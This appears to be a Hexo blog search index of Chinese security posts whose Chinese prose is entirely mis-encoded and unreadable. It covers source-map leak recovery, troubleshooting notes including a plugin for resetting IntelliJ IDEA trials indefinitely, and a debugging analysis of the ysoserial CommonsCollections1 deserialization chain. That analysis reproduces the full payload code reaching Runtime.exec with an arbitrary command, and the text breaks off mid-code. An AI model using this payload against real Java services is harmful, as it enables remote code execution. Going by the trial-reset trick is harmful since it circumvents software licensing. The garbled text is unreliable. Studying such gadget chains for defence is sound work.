<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>redisæœªæˆæƒéªŒè¯æµç¨‹</title>
      <link href="/2022/01/16/stjc/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/"/>
      <url>/2022/01/16/stjc/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a class="markdownIt-Anchor" href="#">#</a> </h1>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis,æœªæˆæƒ,æ¼æ´åˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sourcemapæ³„éœ²è·å–å‰ç«¯æºç </title>
      <link href="/2021/12/03/stjc/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/"/>
      <url>/2021/12/03/stjc/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>reverse-sourcemap ä¸‹è½½åœ°å€:<a href="https://github.com/davidkevork/reverse-sourcemap">https://github.com/davidkevork/reverse-sourcemap</a></p><ol><li><p>å®‰è£… nodejs</p><p><code>apt install npm</code></p></li><li><p>reverse-sourcemap</p><p><code>npm install --global reverse-sourcemap</code></p></li><li><p>ä½¿ç”¨.js.map æ–‡ä»¶è·å–å‰ç«¯æºç </p><p><code> reverse-sourcemap -v xxx.js.map -o output</code></p><p><img src="1.png" alt=""></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‰åç«¯åˆ†ç¦» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é—®é¢˜åŠè§£å†³è®°å½•</title>
      <link href="/2021/09/08/other/%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/09/08/other/%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="java"><a class="markdownIt-Anchor" href="#java">#</a> Java</h1><h2 id="debugè°ƒè¯•æŠ¥é”™"><a class="markdownIt-Anchor" href="#debugè°ƒè¯•æŠ¥é”™">#</a> debugï¼Œè°ƒè¯•æŠ¥é”™</h2><p>æ›´æ¢ jdk8 åæ— æ³• debugï¼Œå¯ä»¥ run</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">D:\è¯­è¨€ç¯å¢ƒ\JDK8_32\bin\java.exe ...</span><br><span class="line">FATAL ERROR in native method: JDWP No transports initialized, jvmtiError=AGENT_ERROR_TRANSPORT_LOAD(196)</span><br><span class="line">Picked up JAVA_TOOL_OPTIONS: -Dfile.encoding=UTF-8</span><br><span class="line">ERROR: transport library not found: dt_socket</span><br><span class="line">ERROR: JDWP Transport dt_socket failed to initialize, TRANSPORT_LOAD(509)</span><br><span class="line">JDWP exit error AGENT_ERROR_TRANSPORT_LOAD(196): No transports initialized [debugInit.c:750]</span><br><span class="line"></span><br><span class="line">Process finished with exit code 1</span><br></pre></td></tr></table></figure><p>æ›´æ¢ idea ä¸‹è½½åçš„ jdk8 åè§£å†³é—®é¢˜ï¼Œç›®æµ‹å› ä¸ºè‡ªå·±è®¾ç½®çš„ jdk è·¯å¾„åŒ…å«ä¸­æ–‡ï¼ˆout-of-ascii pathï¼‰</p><h2 id="ideaé‡ç½®æ’ä»¶"><a class="markdownIt-Anchor" href="#ideaé‡ç½®æ’ä»¶">#</a> idea é‡ç½®æ’ä»¶</h2><p>idea æ— é™é‡ç½®æ–¹æ³•</p><ol><li><p>settings -&gt; plugins -&gt; è®¾ç½®å›¾æ ‡ -&gt; Manage Repositoriesï¼Œæ·»åŠ ï¼š<a href="https://plugins.zhile.io">https://plugins.zhile.io</a></p></li><li><p>åœ¨æ’ä»¶å¸‚åœºæœç´¢ IDE eval reset</p></li></ol><h1 id="linux"><a class="markdownIt-Anchor" href="#linux">#</a> Linux</h1><h2 id="è™šæ‹Ÿæœºç‰©ç†æœºäº’ping"><a class="markdownIt-Anchor" href="#è™šæ‹Ÿæœºç‰©ç†æœºäº’ping">#</a> è™šæ‹Ÿæœºç‰©ç†æœºäº’ ping</h2><h3 id="natæ¨¡å¼ç‰©ç†æœºpingä¸é€šè™šæ‹Ÿæœº"><a class="markdownIt-Anchor" href="#natæ¨¡å¼ç‰©ç†æœºpingä¸é€šè™šæ‹Ÿæœº">#</a> nat æ¨¡å¼ç‰©ç†æœº ping ä¸é€šè™šæ‹Ÿæœº</h3><p><strong>è™šæ‹Ÿæœº ipï¼š192.168.163.128</strong></p><p><strong>ç‰©ç†æœº ipï¼š192.168.46.197</strong></p><p>ä¸åœ¨åŒä¸€ç½‘æ®µï¼Œæ›´æ”¹è™šæ‹Ÿæœºç½‘å¡é…ç½®ä¸ºåŒä¸€ç½‘æ®µ</p><p>ç¼–è¾‘ -&gt; è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨</p><p><img src="1.png" alt=""></p><p>ç„¶å linux ä¸‹é‡å¯ç½‘å¡ <code> systemctl restart networking</code></p><p>è·å¾—<strong>è™šæ‹Ÿæœº ipï¼š192.168.46.128</strong></p><p>ç‰©ç†æœºè¿˜æ˜¯ ping ä¸é€šçš„è¯ï¼Œæ‰“å¼€ <code> æ§åˆ¶é¢æ¿\ç½‘ç»œå’Œ Internet\ç½‘ç»œè¿æ¥</code></p><p>æˆ‘ nat æ¨¡å¼å¯¹åº” VMnet8 ç½‘å¡ï¼Œå³å‡»ç¦ç”¨åå†å¯åŠ¨</p><p><img src="2.png" alt=""></p><p>ç‰©ç†æœº ping é€šè™šæ‹Ÿæœº</p><p><img src="3.png" alt=""></p><h3 id="natæ¨¡å¼è™šæ‹Ÿæœºpingä¸é€šç‰©ç†æœº"><a class="markdownIt-Anchor" href="#natæ¨¡å¼è™šæ‹Ÿæœºpingä¸é€šç‰©ç†æœº">#</a> nat æ¨¡å¼è™šæ‹Ÿæœº ping ä¸é€šç‰©ç†æœº</h3><p><strong>è™šæ‹Ÿæœº ipï¼š192.168.163.128</strong></p><p><strong>ç‰©ç†æœº ipï¼š192.168.46.128</strong></p><p>æµ‹è¯•è¿‡ä¸æ˜¯é˜²ç«å¢™çš„é—®é¢˜</p><p><a href="http://xn--pingbaidu-927nn75bg59o.com">å¯ä»¥ ping é€š baidu.com</a></p><p>å’Œç‰©ç†æœºåŒä¸€ç½‘æ®µ</p><p><strong>ç‰©ç†æœºå¯ ping é€šè™šæ‹Ÿæœº</strong></p><p>æ‰“å¼€ ç¼–è¾‘ -&gt; è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ï¼Œç‚¹å‡»è¿˜åŸé»˜è®¤è®¾ç½®</p><p><img src="4.png" alt=""></p><p>æ­¤æ—¶å‘ç°è™šæ‹Ÿæœºå’Œç‰©ç†æœºä¸æ˜¯åŒä¸€ç½‘æ®µï¼Œä½†æ˜¯å¯ä»¥äº’ ping</p><p>ç‰©ç†æœº ping è™šæ‹Ÿæœºï¼š</p><p><img src="5.png" alt=""></p><p>è™šæ‹Ÿæœº ping ç‰©ç†æœºï¼š</p><p><img src="6.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ysoserialä¹‹CommonsCollections1è°ƒè¯•</title>
      <link href="/2021/09/07/dmsj/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/"/>
      <url>/2021/09/07/dmsj/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆ©ç”¨é“¾ç®€è¿°"><a class="markdownIt-Anchor" href="#åˆ©ç”¨é“¾ç®€è¿°">#</a> åˆ©ç”¨é“¾ç®€è¿°</h1><ol><li>ä»»æ„æ–¹æ³•æ‰§è¡Œ</li><li>é«˜ç‰ˆæœ¬ java å·²ä¿®å¤ï¼ˆJava 8u71 ä»¥åï¼‰</li></ol><h1 id="commonscollections1åˆ©ç”¨ä»£ç "><a class="markdownIt-Anchor" href="#commonscollections1åˆ©ç”¨ä»£ç ">#</a> CommonsCollections1 åˆ©ç”¨ä»£ç </h1><p>é¡¹ç›®åœ°å€ï¼š<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">LazyMap.get()</span></span><br><span class="line"><span class="comment">ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Class.getMethod()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requires:</span></span><br><span class="line"><span class="comment">commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest</span> ( precondition = <span class="string">&quot;isApplicableJavaVersion&quot;</span>)</span><br><span class="line"><span class="meta">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">InvocationHandler</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line"><span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">PayloadRunner.run(CommonsCollections1.class, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="è°ƒè¯•åˆ†æ"><a class="markdownIt-Anchor" href="#è°ƒè¯•åˆ†æ">#</a> è°ƒè¯•åˆ†æ</h1><p>ysoserialPOC ç±»ä¸­ getObject æ–¹æ³•ä¸€èˆ¬æ˜¯è·å– payload çš„æ–¹æ³•</p><h2 id="åˆ†æpaylaodæ„é€ "><a class="markdownIt-Anchor" href="#åˆ†æpaylaodæ„é€ ">#</a> åˆ†æ paylaod æ„é€ </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// ä¼ å…¥çš„å‘½ä»¤å‚æ•°å­˜å‚¨äºexecArgsæ•°ç»„ä¸­</span></span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">    <span class="comment">// å¼€å§‹æ„é€ transformerChainï¼Œç”¨äºæ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line">    <span class="comment">// è¿™ä¸€æ­¥æ®pç¥æ‰€è¨€æ˜¯ä¸ºäº†éšè—æ—¥å¿—ä¸­çš„è¿›ç¨‹æ—¥å¸¸ä¿¡æ¯ï¼Œ åŠ ä¸åŠ éƒ½ä¼šæ‰§è¡Œå‘½ä»¤ï¼Œåªæ˜¯å¼‚å¸¸ä¿¡æ¯ä¸åŒ</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line"><span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line">    <span class="comment">// é€šè¿‡åå°„è·å¾—Runtime.exec(),å¹¶å°†å‘½ä»¤å‚æ•°execArgsä¼ å…¥</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) </span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">// ä¿®é¥°innerMapï¼Œå°†æ„é€ çš„transformerChainä¼ å…¥</span></span><br><span class="line">    <span class="comment">// å½“LayMap#getè¢«è°ƒç”¨æ—¶ï¼Œä¼šæ‰§è¡Œä¼ å…¥çš„transformerChain</span></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†lazyMapä¼ å…¥AnnotationInvocationHandler</span></span><br><span class="line">    <span class="comment">// javaä»£ç†sun.reflect.annotation.AnnotationInvocationHandler</span></span><br><span class="line">    <span class="comment">// è·å¾—ä»£ç†å¯¹è±¡æ—¶ï¼Œä¼šå†ä¼ å…¥ä¸€ä¸ªhandlerï¼ˆç®€ç§°handler2ï¼‰ï¼Œå¾—åˆ°ä»£ç†å¯¹è±¡mapProxyï¼Œ</span></span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"><span class="comment">// å°†è¯¥ä»£ç†å¯¹è±¡åŒ…è£¹è¿›å…¥æ–°çš„handlerï¼Œç®€ç§°handler1</span></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"><span class="comment">// æœ€åå°†æ„é€ å¥½çš„å‘½ä»¤æ‰§è¡Œtransformersä¼ å…¥transformerChain</span></span><br><span class="line">    <span class="comment">// æœ€åæ”¾æ˜¯ä¸ºäº†é˜²æ­¢åœ¨æ„é€ payloadæ—¶å¼¹å‡ºè®¡ç®—å™¨</span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"><span class="comment">// æœ€ååŒ…è£…å¥½çš„handlerå³ä¸ºæˆ‘ä»¬çš„payload</span></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="çŸ¥è¯†ç‚¹"><a class="markdownIt-Anchor" href="#çŸ¥è¯†ç‚¹">#</a> çŸ¥è¯†ç‚¹</h3><p>éœ€è¦ç†è§£çš„çŸ¥è¯†ç‚¹ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†ï¼štransform å’Œ proxy</p><p>æƒ³è¦æ·±ç©¶çš„è¯å¯ä»¥å»çœ‹è¯¦ç»†è§£é‡Šï¼Œä»¥ä¸‹åªè®°å½•æ­¤å¤„ç”¨åˆ°çš„ç‚¹</p><p>æˆ‘çœ‹ä»£ç†çš„æ—¶å€™æ˜¯å‚è€ƒçš„è¿™ç¯‡æ–‡ç« ï¼š<a href="https://xie.infoq.cn/article/9a9387805a496e1485dc8430f">https://xie.infoq.cn/article/9a9387805a496e1485dc8430f</a></p><h4 id="å…ˆæ¥çœ‹çœ‹trasnform"><a class="markdownIt-Anchor" href="#å…ˆæ¥çœ‹çœ‹trasnform">#</a> å…ˆæ¥çœ‹çœ‹ trasnform</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">    <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br></pre></td></tr></table></figure><p><strong>ConstantTransformer</strong></p><p>æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ªç±»</p><p>é€šè¿‡è¯¥ç±»çš„ transform æ–¹æ³•è·å–ä¸€ä¸ªå¯¹è±¡ç±»å‹ï¼Œå¦‚ transform å‚æ•°æ˜¯ Runtime.class æ—¶ï¼Œè°ƒç”¨ ConstantTransformer ç±»çš„ transform æ–¹æ³•ï¼Œæ‰§è¡Œåè¿”å› java.lang.Runtime ç±»</p><p><strong>InvokerTransformer</strong></p><p>æ„é€ æ–¹æ³• InvokerTransformer (String methodName, Class [] paramTypes, Object [] args)</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ–¹æ³•å‚æ•°ç±»å‹æ•°ç»„ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºæ–¹æ³•å‚æ•°æ•°ç»„</p><p>è¯¥ç±»çš„ transform é€šè¿‡åå°„æ‰§è¡Œå‡½æ•°</p><p>ä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼Œtransform ä¼ å…¥ Runtime å¯¹è±¡ï¼Œé€šè¿‡åå°„æ‰§è¡Œ exec å‡½æ•°ï¼Œä¼ å…¥å‘½ä»¤ä¸º calc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure><p><strong>transformerChain</strong></p><p>transformers çš„é“¾ï¼Œæ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª transform æ•°ç»„</p><p>ä¸²èµ·æ¥äº†å¾ˆå¤š transformer</p><p>ä¸ºä»€ä¹ˆæ˜¯ä¸²èµ·æ¥çš„å‘¢ï¼Œè§ä¸‹å›¾</p><p><img src="62.png" alt=""></p><p>å…¶ä¸­å‰é¢ä¸€ä¸ª transform è¾“å‡ºçš„ç»“æœä¼šä½œä¸ºå‚æ•°ä¼ å…¥åä¸€ä¸ª transform</p><p>é‚£ä¹ˆæ­¤å¤„ä»£ç å°±å¯ä»¥å¾ˆå¥½çš„è§£é‡Šå•¦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡åå°„è·å–Runtimeï¼Œå› ä¸ºClassç±»å®ç°äº†Serializableæ¥å£</span></span><br><span class="line"><span class="comment">//        Method f = Runtime.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) f.invoke(null);</span></span><br><span class="line"><span class="comment">//        r.exec(&quot;C:\\WINDOWS\\system32\\calc.exe&quot;</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">        <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">    <span class="comment">// real chain for after setup</span></span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="comment">// è¿”å›java.lang.Runtimeç±»</span></span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),  </span><br><span class="line">        <span class="comment">//ä¼ å…¥ä¸Šé¢transformå¾—åˆ°çš„Runtimeç±»ï¼ˆClasså¯¹è±¡ï¼‰ï¼Œè°ƒç”¨getMethodæ–¹æ³•ï¼Œä¼ å…¥è°ƒç”¨getMethodæ–¹æ³•æ–¹æ³•å‚æ•°ä¸ºgetRuntimeï¼›ä¹Ÿå°±æ˜¯è·å–è¯¥ç±»çš„getRuntimeæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span 